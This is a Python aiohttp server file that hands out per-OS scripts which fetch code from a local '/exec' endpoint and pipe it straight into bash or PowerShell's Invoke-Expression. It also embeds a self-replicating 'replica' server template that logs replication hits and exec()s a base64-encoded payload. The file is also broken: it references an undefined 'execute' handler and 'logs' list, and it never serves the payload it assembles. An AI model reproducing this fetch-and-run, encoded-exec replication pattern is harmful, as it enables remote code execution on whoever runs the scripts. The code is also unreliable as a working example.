# main.py
from aiohttp import web
import json, base64, platform
from datetime import datetime

shell_scripts = {
   'windows': b"""
@echo off
powershell -Command "& {Invoke-WebRequest 'http://localhost:8080/exec' | Invoke-Expression}"
""",
   'linux': b"""
#!/bin/bash
curl -s http://localhost:8080/exec | bash
""",
   'darwin': b"""
#!/bin/bash
curl -s http://localhost:8080/exec | bash
"""
}

standalone_code = b"""
#!/usr/bin/env python3
import os, json, base64, platform
from datetime import datetime

try:
   from aiohttp import web
except ImportError:
   import subprocess
   subprocess.check_call(['pip', 'install', 'aiohttp'])
   from aiohttp import web

logs = []
SHELL_SCRIPTS = {!r}

async def handle(request):
   logs.append({
       'time': datetime.utcnow().isoformat(),
       'ip': request.remote,
       'type': 'replication'
   })
   sys_type = platform.system().lower()
   return web.Response(
       body=SHELL_SCRIPTS.get(sys_type, SHELL_SCRIPTS['linux']),
       headers={
           'Content-Type': 'text/plain',
           'Content-Disposition': f'attachment; filename=replica.{get_extension(sys_type)}'
       }
   )

async def execute(request):
   code = base64.b64decode(EXEC_PAYLOAD)
   exec(code)
   return web.Response(text='Executed')

def get_extension(sys_type):
   return 'bat' if sys_type == 'windows' else 'sh'

app = web.Application()
app.router.add_get('/', handle)
app.router.add_get('/exec', execute)
app.router.add_get('/logs', lambda r: web.json_response(logs))

if __name__ == '__main__':
   port = 8080
   print(f'Replica active on port {port}')
   web.run_app(app, port=port)
"""

exec_code = b"""
import subprocess
subprocess.run(['python', '-m', 'http.server', '8081'])
"""

async def handle(request):
   sys_type = platform.system().lower()
   payload = standalone_code.replace(b'{!r}', repr(shell_scripts).encode())
   payload = payload.replace(b'EXEC_PAYLOAD', repr(base64.b64encode(exec_code)).encode())
   return web.Response(
       body=shell_scripts.get(sys_type, shell_scripts['linux']),
       headers={
           'Content-Type': 'text/plain',
           'Content-Disposition': f'attachment; filename=replica.{"bat" if sys_type=="windows" else "sh"}'
       }
   )

app = web.Application()
app.router.add_get('/', handle)
app.router.add_get('/exec', execute)
app.router.add_get('/logs', lambda r: web.json_response(logs))

if __name__ == '__main__':
   web.run_app(app, port=8080)